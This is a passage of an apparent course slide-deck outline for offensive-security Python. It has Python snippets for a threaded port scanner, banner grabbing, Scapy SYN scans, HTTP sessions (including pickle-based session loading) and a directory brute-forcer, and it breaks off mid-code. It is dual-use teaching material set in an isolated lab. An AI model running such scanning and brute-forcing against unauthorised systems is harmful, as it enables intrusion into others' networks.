# Python for Hackers: Complete Slide Deck Outlines

## Comprehensive Teaching Presentation Structure

This document provides detailed, extensive slide outlines for teaching the entire Python for Hackers series. Each slide includes speaker notes, key talking points, and code examples.

---

## Series Overview & Navigation

### Part 0: Introduction to the Series

#### Slide 0.1: Title Slide
```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                     PYTHON FOR HACKERS                      │
│                                                             │
│              From Novice to Offensive Security              │
│                    Engineer in 30 Days                      │
│                                                             │
│              ───────────────────────────────                │
│                                                             │
│                   Series Introduction                       │
│                                                             │
│         [Presenter Name] | [Date] | [Conference]           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Welcome attendees to this comprehensive series
- Explain the journey from Python basics to advanced offensive security
- Set expectations for the 30-day learning path

---

#### Slide 0.2: What You'll Build

```
┌─────────────────────────────────────────────────────────────┐
│                    YOUR COMPLETE TOOLKIT                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │
│   │   RECON     │  │    WEB      │  │  EXPLOIT    │       │
│   │  Scanner    │  │  Brute-     │  │  Framework  │       │
│   │  Sniffer    │  │  Forcer     │  │  Payloads   │       │
│   │  Packet     │  │  Analyzer   │  │  Exfil      │       │
│   └─────────────┘  └─────────────┘  └─────────────┘       │
│                                                             │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │
│   │     C2      │  │   POST-     │  │   PACKAGING │       │
│   │   Server    │  │   EXPLOIT   │  │   Deploy    │       │
│   │   Agent     │  │  Enum       │  │   Signed    │       │
│   │             │  │  Persist    │  │   Tools     │       │
│   └─────────────┘  └─────────────┘  └─────────────┘       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- 6 main components that make up the complete toolkit
- Each module builds on the previous one
- All code is production-ready and extensively commented

---

#### Slide 0.3: Target Audience
```
┌─────────────────────────────────────────────────────────────┐
│                      WHO THIS IS FOR                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Security Analysts   →    Automate analysis & testing     │
│   Penetration Testers →    Build custom tools              │
│   Red Teamers        →    Develop bespoke C2 & payloads    │
│   Software Engineers →    Transition into security         │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Prerequisites:                                            │
│   ✓ Basic Python syntax                                     │
│   ✓ Command line familiarity                                │
│   ✓ Fundamental networking concepts                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- This course bridges the gap between knowing Python and applying it to security
- No advanced security knowledge required
- Emphasis on practical, hands-on learning

---

#### Slide 0.4: The Architecture
```
┌─────────────────────────────────────────────────────────────┐
│                  OFENSIVE PYTHON TOOLKIT                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │              C2 MODULE                              │   │
│   │   HTTP/HTTPS │ DNS Tunneling │ ICMP Channel        │   │
│   └─────────────────────────────────────────────────────┘   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │           RECONNAISSANCE MODULE                     │   │
│   │   Port Scanner │ Banner Grabber │ Directory Brute  │   │
│   └─────────────────────────────────────────────────────┘   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │             WEB ATTACK MODULE                       │   │
│   │   HTTP Client │ Form Parser │ Auth Automation      │   │
│   └─────────────────────────────────────────────────────┘   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │             EXPLOIT MODULE                          │   │
│   │   Payload Generator │ Obfuscation │ Exfiltration   │   │
│   └─────────────────────────────────────────────────────┘   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │          POST-EXPLOITATION MODULE                   │   │
│   │   Enumerator │ Persistence │ Packaging             │   │
│   └─────────────────────────────────────────────────────┘   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │                CORE FRAMEWORK                       │   │
│   │   Config │ Logging │ Error Handling │ Thread Pool │   │
│   └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Modular architecture ensures maintainability
- Each layer can be used independently
- Core framework provides common utilities

---

#### Slide 0.5: Learning Path
```
┌─────────────────────────────────────────────────────────────┐
│                     30-DAY LEARNING PATH                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   DAY 1-2    │  Foundation & Environment Setup             │
│   DAY 3-4    │  Network Programming with Sockets           │
│   DAY 5-7    │  Web Reconnaissance & Automation            │
│   DAY 8-9    │  Exploit Development                        │
│   DAY 10-11  │  Payload Obfuscation                        │
│   DAY 12-14  │  Data Exfiltration                          │
│   DAY 15-18  │  C2 Framework Development                   │
│   DAY 19-22  │  Post-Exploitation & Persistence            │
│   DAY 23-25  │  Packaging & Deployment                     │
│   DAY 26-30  │  Real-World Scenarios & CTF Practice        │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   ⏱ Total: 30 Days • 15,000+ Lines of Code               │
│         35+ Files • 40+ Classes                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Structured progression from fundamentals to advanced topics
- Each module includes hands-on coding exercises
- By day 30, you'll have a complete offensive toolkit

---

## Part 1: Foundations & Network Fundamentals

### Phase 1.1: Lab Setup & Environment Configuration

#### Slide 1.1.1: Why a Virtual Lab
```
┌─────────────────────────────────────────────────────────────┐
│                   VIRTUAL LAB CONCEPT                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Think of it like setting up a boxing gym:                │
│                                                             │
│   • Safe practice space = Isolated network                 │
│   • Practice partners = Vulnerable target VMs              │
│   • Training gear = Kali Linux with tools                  │
│   • Protective equipment = Snapshots to roll back          │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Why VMs?                                                  │
│   • Completely isolated networks                            │
│   • Rollback to clean state                                 │
│   • Multiple OS simultaneously                              │
│   • Zero impact on host machine                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- A virtual lab is essential for safe learning
- Explain the boxing gym analogy
- Emphasize that safety is the #1 priority

---

#### Slide 1.1.2: Architecture Diagram
```
┌─────────────────────────────────────────────────────────────┐
│                    LAB ARCHITECTURE                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│                     ┌───────────────┐                       │
│                     │   HOST MACHINE│                       │
│                     │  (Your Computer)│                     │
│                     └───────┬───────┘                       │
│                             │                               │
│              ┌──────────────┼──────────────┐                │
│              │              │              │                │
│        ┌─────┴─────┐ ┌──────┴──────┐ ┌─────┴─────┐        │
│        │  Kali     │ │   Ubuntu    │ │  Windows  │        │
│        │ Attacker  │ │   Target    │ │  Target   │        │
│        │ 192.168.  │ │  192.168.   │ │ 192.168.  │        │
│        │ 100.10    │ │  100.20     │ │  100.30   │        │
│        └───────────┘ └─────────────┘ └───────────┘        │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Virtual Network: 192.168.100.0/24 (Host-Only)           │
│   🔒 Completely isolated from the internet                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show the network topology
- Explain host-only network configuration
- Emphasize safety of isolation

---

#### Slide 1.1.3: Setup Commands
```bash
┌─────────────────────────────────────────────────────────────┐
│                    SETUP COMMANDS                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   # System Updates                                          │
│   sudo apt update && sudo apt upgrade -y                   │
│                                                             │
│   # Install Python 3                                        │
│   sudo apt install python3 python3-pip python3-venv -y     │
│                                                             │
│   # Create project directory                                │
│   mkdir ~/hacking-toolkit                                  │
│   cd ~/hacking-toolkit                                     │
│                                                             │
│   # Virtual environment                                     │
│   python3 -m venv hacker-env                               │
│   source hacker-env/bin/activate                           │
│                                                             │
│   # Directory structure                                     │
│   mkdir -p {recon,web-attack,exploit,post-exploit}         │
│   mkdir -p {framework,payloads,config,modules,utils}       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Walk through each command
- Explain what each directory is for
- Show verification steps

---

### Phase 1.2: Socket Programming

#### Slide 1.2.1: What is a Socket?
```
┌─────────────────────────────────────────────────────────────┐
│                    SOCKET ANALOGY                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   A socket is like a telephone line between computers:     │
│                                                             │
│   You → Pick up phone (create socket)                      │
│     → Dial number (connect to server)                      │
│     → Talk (send request)                                  │
│     → Listen (receive response)                            │
│     → Hang up (close connection)                           │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   TCP = Phone call (reliable, ordered)                     │
│   UDP = Postcard (fast, unreliable)                       │
│                                                             │
│   Socket types:                                             │
│   socket.AF_INET → IPv4                                    │
│   socket.SOCK_STREAM → TCP                                │
│   socket.SOCK_DGRAM → UDP                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the telephone analogy
- Explain the difference between TCP and UDP
- Show socket creation syntax

---

#### Slide 1.2.2: TCP Client-Server Flow
```
┌─────────────────────────────────────────────────────────────┐
│                    TCP CLIENT-SERVER                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   SERVER                        CLIENT                      │
│   ──────                        ──────                      │
│                                                             │
│   1. socket()                ────                           │
│   2. bind()                  ────                           │
│   3. listen()                ────                           │
│   4. accept()      ◄──────────────  connect()              │
│   5. recv()        ◄──────────────  send()                 │
│   6. send()        ──────────────►  recv()                 │
│   7. close()       ──────────────►  close()                │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Code Example:                                             │
│   server_socket = socket.socket(AF_INET, SOCK_STREAM)      │
│   server_socket.bind(('0.0.0.0', 9999))                   │
│   server_socket.listen(5)                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Walk through the handshake process
- Show code for each step
- Mention the three-way handshake (SYN, SYN-ACK, ACK)

---

#### Slide 1.2.3: TCP Server Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    TCP ECHO SERVER                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import socket                                             │
│   import threading                                          │
│                                                             │
│   class TCPEchoServer:                                      │
│       def __init__(self, host='0.0.0.0', port=9999):      │
│           self.host = host                                  │
│           self.port = port                                  │
│           self.server_socket = None                         │
│                                                             │
│       def start(self):                                      │
│           self.server_socket = socket.socket(              │
│               socket.AF_INET, socket.SOCK_STREAM           │
│           )                                                 │
│           self.server_socket.setsockopt(                   │
│               socket.SOL_SOCKET, socket.SO_REUSEADDR, 1   │
│           )                                                 │
│           self.server_socket.bind((self.host, self.port)) │
│           self.server_socket.listen(5)                     │
│                                                             │
│           while True:                                       │
│               client, addr = self.server_socket.accept()   │
│               thread = threading.Thread(                   │
│                   target=self.handle_client,               │
│                   args=(client, addr)                      │
│               )                                             │
│               thread.start()                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Walk through each line
- Explain threading for multiple clients
- Show error handling considerations

---

#### Slide 1.2.4: TCP Client Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    TCP CLIENT                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import socket                                             │
│                                                             │
│   class TCPEchoClient:                                      │
│       def __init__(self, host='127.0.0.1', port=9999):    │
│           self.host = host                                  │
│           self.port = port                                  │
│           self.socket = None                                │
│                                                             │
│       def connect(self):                                    │
│           self.socket = socket.socket(                     │
│               socket.AF_INET, socket.SOCK_STREAM           │
│           )                                                 │
│           self.socket.settimeout(3.0)                      │
│           self.socket.connect((self.host, self.port))      │
│           return True                                       │
│                                                             │
│       def send_message(self, message):                     │
│           self.socket.send(message.encode('utf-8'))        │
│           response = self.socket.recv(1024)                │
│           return response.decode('utf-8')                  │
│                                                             │
│       def disconnect(self):                                 │
│           self.socket.close()                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show how to establish connection
- Explain send/receive pattern
- Mention timeouts

---

#### Slide 1.2.5: UDP Client-Server
```
┌─────────────────────────────────────────────────────────────┐
│                    UDP VS TCP                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   UDP = Connectionless (like sending postcards)            │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   UDP Server:                                               │
│   sock = socket.socket(AF_INET, SOCK_DGRAM)                │
│   sock.bind(('0.0.0.0', 9998))                             │
│   data, addr = sock.recvfrom(1024)                         │
│   sock.sendto(data, addr)                                  │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   UDP Client:                                               │
│   sock = socket.socket(AF_INET, SOCK_DGRAM)                │
│   sock.sendto(b'Hello', ('127.0.0.1', 9998))               │
│   data, addr = sock.recvfrom(1024)                         │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Key Difference: No connection needed!                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Compare TCP and UDP side by side
- Show UDP server code
- Show UDP client code
- Explain when to use each

---

### Phase 1.3: Building a Port Scanner

#### Slide 1.3.1: What is Port Scanning?
```
┌─────────────────────────────────────────────────────────────┐
│                    PORT SCANNING ANALOGY                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like checking doors and windows in a building:          │
│                                                             │
│   • IP Address = Building address                          │
│   • Ports = Doors (numbered 1-65535)                       │
│   • Open port = Unlocked door                              │
│   • Closed port = Locked door                              │
│   • Filtered = Guarded door (can't tell)                  │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Why we scan:                                              │
│   • Discover running services                              │
│   • Identify OS (service fingerprints)                     │
│   • Find attack vectors                                    │
│                                                             │
│   Connect Scan = Full TCP handshake                        │
│   SYN Scan = Only SYN packet (stealth)                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the building/doors analogy
- Explain why port scanning is useful
- Differentiate scan types

---

#### Slide 1.3.2: Scanner Architecture
```
┌─────────────────────────────────────────────────────────────┐
│                    SCANNER ARCHITECTURE                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│                   ┌─────────────────────┐                   │
│                   │   PortScanner       │                   │
│                   ├─────────────────────┤                   │
│                   │ - target            │                   │
│                   │ - ports[]           │                   │
│                   │ - max_threads       │                   │
│                   │ - timeout           │                   │
│                   │ - results[]         │                   │
│                   └──────────┬──────────┘                   │
│                              │                               │
│     ┌────────────────────────┼────────────────────────┐     │
│     │                        │                        │     │
│     ▼                        ▼                        ▼     │
│ ┌─────────┐           ┌─────────┐            ┌─────────┐  │
│ │ Worker  │           │ Worker  │            │ Worker  │  │
│ │ Thread  │           │ Thread  │            │ Thread  │  │
│ └────┬────┘           └────┬────┘            └────┬────┘  │
│      │                     │                     │        │
│      └─────────────────────┼─────────────────────┘        │
│                            │                               │
│                            ▼                               │
│                ┌─────────────────────┐                     │
│                │  Result Queue       │                     │
│                └─────────────────────┘                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show the multithreading pattern
- Explain how workers get port assignments
- Discuss queue management

---

#### Slide 1.3.3: Port Scanning Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    PORT SCANNER CODE                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import socket                                             │
│   import threading                                          │
│   import queue                                              │
│                                                             │
│   class PortScanner:                                        │
│       def __init__(self, target, ports, max_threads=50,   │
│                    timeout=2.0):                           │
│           self.target = target                              │
│           self.ports = ports                                │
│           self.max_threads = max_threads                    │
│           self.timeout = timeout                            │
│           self.open_ports = []                              │
│           self.scan_queue = queue.Queue()                   │
│           self.lock = threading.Lock()                      │
│                                                             │
│       def scan_port(self, port):                           │
│           try:                                              │
│               sock = socket.socket(AF_INET, SOCK_STREAM)   │
│               sock.settimeout(self.timeout)                │
│               result = sock.connect_ex(                    │
│                   (self.target, port)                      │
│               )                                             │
│               if result == 0:                               │
│                   return {'port': port, 'state': 'open'}   │
│               sock.close()                                  │
│               return None                                   │
│           except:                                           │
│               return None                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show scanning logic with connect_ex
- Explain return codes
- Discuss error handling

---

#### Slide 1.3.4: Banner Grabbing
```python
┌─────────────────────────────────────────────────────────────┐
│                    BANNER GRABBING                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def grab_banner(self, sock, port):                       │
│       try:                                                  │
│           # HTTP ports                                      │
│           if port in [80, 443, 8080]:                      │
│               sock.send(b'HEAD / HTTP/1.0\r\n\r\n')        │
│           # SMTP                                            │
│           elif port == 25:                                  │
│               sock.send(b'HELO localhost\r\n')             │
│           # FTP                                             │
│           elif port == 21:                                  │
│               sock.send(b'USER anonymous\r\n')             │
│           else:                                             │
│               # Just read what comes back                  │
│               pass                                          │
│                                                             │
│           banner = sock.recv(1024).strip()                 │
│           return banner.decode('utf-8', errors='ignore')   │
│       except:                                               │
│           return None                                       │
│                                                             │
│   Service Signatures:                                       │
│   SSH → b'SSH', b'OpenSSH'                                 │
│   HTTP → b'Apache', b'nginx', b'Server:'                  │
│   FTP → b'220', b'vsFTPd'                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show how to extract service information
- Explain protocol-specific probes
- Discuss service identification

---

#### Slide 1.3.5: Scanner Output
```
┌─────────────────────────────────────────────────────────────┐
│                    SCANNER OUTPUT                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   $ python3 port_scanner.py 192.168.1.1 -p 22,80,443      │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   [*] Starting port scan on 192.168.1.1                    │
│   [*] Scanning 3 ports using 50 threads                    │
│   [*] Timeout: 2.0s, Banner grabbing: True                 │
│   [*] Start time: 2024-01-15 14:30:25                     │
│   [+] Port 22 is OPEN - ssh                                │
│   [+] Port 80 is OPEN - http                               │
│   [*] Progress: 3/3 ports scanned (100.0%)                 │
│   [*] Scan completed in 0.23 seconds                       │
│                                                             │
│   ========================================================= │
│     SCAN RESULTS FOR 192.168.1.1                           │
│   ========================================================= │
│   PORT  STATE  SERVICE   VERSION                            │
│   22    open   ssh      SSH-2.0-OpenSSH_8.9p1              │
│   80    open   http     Apache/2.4.52                     │
│   ========================================================= │
│   Total open ports: 2                                       │
│   Scan duration: 0.23 seconds                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show actual output
- Explain each section
- Discuss performance

---

### Phase 1.4: Packet Crafting with Scapy

#### Slide 1.4.1: What is Scapy?
```
┌─────────────────────────────────────────────────────────────┐
│                    SCAPY OVERVIEW                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Scapy = Python's most powerful packet library            │
│                                                             │
│   Capabilities:                                             │
│   • Create packets at any layer                            │
│   • Send packets and receive responses                     │
│   • Sniff network traffic                                   │
│   • Analyze packet contents                                 │
│   • Implement custom protocols                              │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Layer stacking:                                           │
│   Ethernet → IP → TCP/UDP/ICMP → Payload                   │
│   Ether() / IP() / TCP()                                   │
│                                                             │
│   Common Layers:                                            │
│   Ether - Ethernet frame                                    │
│   IP - Internet Protocol                                    │
│   TCP - Transmission Control Protocol                       │
│   UDP - User Datagram Protocol                              │
│   ICMP - Internet Control Message Protocol                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Introduce Scapy as a packet Swiss Army knife
- Show layer stacking concept
- Explain common layers

---

#### Slide 1.4.2: Creating Packets with Scapy
```python
┌─────────────────────────────────────────────────────────────┐
│                    CREATING PACKETS                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   from scapy.all import *                                   │
│                                                             │
│   # IP Packet                                               │
│   ip = IP(src="192.168.1.1", dst="8.8.8.8", ttl=64)        │
│                                                             │
│   # TCP Packet                                              │
│   tcp = TCP(sport=12345, dport=80, flags="S")             │
│                                                             │
│   # UDP Packet                                              │
│   udp = UDP(sport=12345, dport=53)                         │
│                                                             │
│   # ICMP Packet (Ping)                                      │
│   icmp = ICMP(type=8, code=0)                              │
│                                                             │
│   # Combine Layers                                          │
│   packet = ip / tcp   # IP + TCP                           │
│   packet = ip / udp   # IP + UDP                           │
│   packet = ip / icmp  # IP + ICMP                          │
│                                                             │
│   # Ethernet Frame                                          │
│   eth = Ether(src="00:11:22:33:44:55",                    │
│               dst="aa:bb:cc:dd:ee:ff")                    │
│   packet = eth / ip / tcp                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show how to create each layer
- Explain the / operator for layering
- Show Ethernet frame creation

---

#### Slide 1.4.3: Sending & Receiving
```python
┌─────────────────────────────────────────────────────────────┐
│                    SENDING & RECEIVING                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   from scapy.all import *                                   │
│                                                             │
│   # Send packet (no response)                               │
│   send(packet)                                              │
│                                                             │
│   # Send and receive 1 response                             │
│   response = sr1(packet)                                   │
│                                                             │
│   # Send and receive multiple                               │
│   answers, unanswered = sr(packet)                         │
│                                                             │
│   # Sniff packets                                           │
│   packets = sniff(count=10, filter="tcp", timeout=5)       │
│                                                             │
│   # Show packet details                                     │
│   packet.show()                                             │
│   packet.summary()                                          │
│   hexdump(packet)                                           │
│                                                             │
│   # Save/Load packets                                       │
│   wrpcap('capture.pcap', packets)                           │
│   packets = rdpcap('capture.pcap')                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show send vs send-receive
- Explain sniffing filters
- Demonstrate packet persistence

---

#### Slide 1.4.4: TCP Connect Scan with Scapy
```python
┌─────────────────────────────────────────────────────────────┐
│                    TCP SCAN WITH SCAPY                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def tcp_connect_scan(self, target, ports):               │
│       open_ports = []                                       │
│                                                             │
│       for port in ports:                                    │
│           # Create SYN packet                               │
│           ip = IP(dst=target)                               │
│           tcp = TCP(dport=port, flags='S')                 │
│           packet = ip / tcp                                 │
│                                                             │
│           # Send and receive                                │
│           response = sr1(packet, timeout=2)                │
│                                                             │
│           # Check for SYN-ACK                               │
│           if response and response[TCP].flags & 0x12:      │
│               open_ports.append(port)                       │
│               # Send RST to close connection               │
│               rst = IP(dst=target) / TCP(                  │
│                   dport=port, flags='R'                    │
│               )                                             │
│               send(rst)                                     │
│                                                             │
│       return open_ports                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show Scapy-based scanning
- Explain TCP flags
- Compare to socket-based scanning

---

#### Slide 1.4.5: Traceroute with Scapy
```python
┌─────────────────────────────────────────────────────────────┐
│                    TRACEROUTE WITH SCAPY                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def traceroute(self, target, max_hops=30):               │
│       hops = []                                             │
│                                                             │
│       for ttl in range(1, max_hops + 1):                   │
│           # Create packet with TTL                         │
│           packet = IP(dst=target, ttl=ttl) / ICMP()        │
│                                                             │
│           # Send and wait for response                     │
│           response = sr1(packet, timeout=2)                │
│                                                             │
│           if response:                                      │
│               src_ip = response.src                         │
│               hops.append(src_ip)                           │
│                                                             │
│               if src_ip == target:                          │
│                   break                                     │
│           else:                                             │
│               hops.append('*')                              │
│                                                             │
│       return hops                                           │
│                                                             │
│   # Output:                                                 │
│   # [1] 192.168.1.1                                         │
│   # [2] 10.0.0.1                                           │
│   # [3] 172.16.0.1                                         │
│   # [4] 8.8.8.8                                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Explain TTL concept
- Show ICMP responses
- Compare to traditional traceroute

---

## Part 2: Web Reconnaissance & Automated Enumeration

### Phase 2.1: HTTP Fundamentals

#### Slide 2.1.1: HTTP Analogy
```
┌─────────────────────────────────────────────────────────────┐
│                    HTTP ANALOGY                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like ordering food in a restaurant:                      │
│                                                             │
│   • Client = You (customer)                                │
│   • Server = Kitchen                                        │
│   • Request = Your order                                    │
│   • Response = Your food                                    │
│   • Headers = Special instructions                         │
│   • Cookies = Loyalty card                                  │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   HTTP Methods (What you want):                             │
│   GET    = "I want to see the menu"                        │
│   POST   = "I want to order"                               │
│   PUT    = "I want to change my order"                     │
│   DELETE = "I want to cancel"                              │
│                                                             │
│   Status Codes (The response):                              │
│   2xx = Success ("Your order is ready")                    │
│   3xx = Redirect ("Restaurant moved")                      │
│   4xx = Client Error ("You made a mistake")                │
│   5xx = Server Error ("Kitchen is on fire")                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the restaurant analogy
- Explain HTTP methods
- List common status codes

---

#### Slide 2.1.2: Requests Library
```python
┌─────────────────────────────────────────────────────────────┐
│                    REQUESTS LIBRARY                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import requests                                           │
│                                                             │
│   # GET                                                     │
│   response = requests.get(                                 │
│       'https://api.example.com/users',                     │
│       params={'id': 1}                                     │
│   )                                                         │
│                                                             │
│   # POST (JSON)                                             │
│   response = requests.post(                                │
│       'https://api.example.com/login',                     │
│       json={'username': 'admin', 'password': 'pass'}       │
│   )                                                         │
│                                                             │
│   # POST (Form Data)                                        │
│   response = requests.post(                                │
│       'https://example.com/login',                         │
│       data={'user': 'admin', 'pass': 'pass'}               │
│   )                                                         │
│                                                             │
│   # Headers                                                 │
│   headers = {                                               │
│       'User-Agent': 'Mozilla/5.0',                         │
│       'X-API-Key': 'abc123'                                │
│   }                                                         │
│   response = requests.get(url, headers=headers)            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show GET vs POST
- Explain JSON vs form data
- Demonstrate headers

---

#### Slide 2.1.3: HTTP Session Management
```python
┌─────────────────────────────────────────────────────────────┐
│                    SESSION MANAGEMENT                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   import requests                                           │
│                                                             │
│   # Create session                                          │
│   session = requests.Session()                             │
│   session.headers.update({'User-Agent': 'Mozilla/5.0'})    │
│                                                             │
│   # Login (saves cookies)                                   │
│   session.post(                                             │
│       'https://example.com/login',                         │
│       data={'username': 'admin', 'password': 'pass'}       │
│   )                                                         │
│                                                             │
│   # Session persists!                                       │
│   response = session.get('https://example.com/dashboard')  │
│                                                             │
│   # Clear session                                           │
│   session.cookies.clear()                                   │
│                                                             │
│   # Save/Load session                                       │
│   import pickle                                             │
│   with open('session.pkl', 'wb') as f:                     │
│       pickle.dump(session, f)                              │
│                                                             │
│   with open('session.pkl', 'rb') as f:                     │
│       session = pickle.load(f)                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show how sessions work
- Explain cookie management
- Demonstrate session persistence

---

### Phase 2.2: Directory Brute-Forcer

#### Slide 2.2.1: Directory Brute-Forcing Concept
```
┌─────────────────────────────────────────────────────────────┐
│                    DIRECTORY BRUTE FORCING                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like trying all keys to find the right one:              │
│                                                             │
│   • Website = Building                                      │
│   • Directories = Doors                                     │
│   • Wordlist = Key ring                                    │
│   • Finding a directory = Finding an unlocked door        │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Why we do it:                                             │
│   • Find hidden admin panels (/admin)                      │
│   • Discover backup files (/backup)                       │
│   • Uncover configuration (/config)                        │
│   • Identify API endpoints (/api)                          │
│   • Find development artifacts (/test)                    │
│                                                             │
│   Common wordlist entries:                                 │
│   admin, login, wp-admin, backup, config, database,       │
│   phpmyadmin, cpanel, webmail, api, v1, v2              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the key ring analogy
- Explain what we're looking for
- Show common wordlist entries

---

#### Slide 2.2.2: Brute-Forcer Architecture
```
┌─────────────────────────────────────────────────────────────┐
│                    BRUTE-FORCER ARCHITECTURE                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────────────────────────────────────────────┐   │
│   │              DirectoryBruteForcer                    │   │
│   ├─────────────────────────────────────────────────────┤   │
│   │  - target_url                                       │   │
│   │  - wordlist                                         │   │
│   │  - extensions                                       │   │
│   │  - threads                                          │   │
│   │  - recursive                                        │   │
│   │  - max_depth                                        │   │
│   │  - results[]                                        │   │
│   └──────────────────┬──────────────────────────────────┘   │
│                      │                                      │
│         ┌────────────┼────────────┐                        │
│         │            │            │                        │
│         ▼            ▼            ▼                        │
│    ┌─────────┐  ┌─────────┐  ┌─────────┐                  │
│    │ Worker  │  │ Worker  │  │ Worker  │                  │
│    │ Thread  │  │ Thread  │  │ Thread  │                  │
│    └─────────┘  └─────────┘  └─────────┘                  │
│         │            │            │                        │
│         └────────────┼────────────┘                        │
│                      │                                      │
│                      ▼                                      │
│         ┌─────────────────────┐                            │
│         │   Status Code       │                            │
│         │   Filtering         │                            │
│         └─────────────────────┘                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show the architecture
- Explain worker threads
- Discuss status code filtering

---

#### Slide 2.2.3: Brute-Forcer Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    BRUTE-FORCER CODE                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def _generate_paths(self, base_path=''):                 │
│       paths = []                                            │
│                                                             │
│       for word in self.wordlist:                           │
│           # Add base path                                   │
│           path = f"{base_path}/{word}" if base_path        │
│                    else word                                │
│           paths.append(path)                               │
│                                                             │
│           # Add with extensions                             │
│           for ext in self.extensions:                      │
│               paths.append(f"{path}{ext}")                 │
│                                                             │
│       return paths                                          │
│                                                             │
│   def _check_path(self, path):                             │
│       try:                                                  │
│           response = self.client.get(path,                 │
│               allow_redirects=self.follow_redirects        │
│           )                                                 │
│                                                             │
│           if response.status_code not in self.exclude:    │
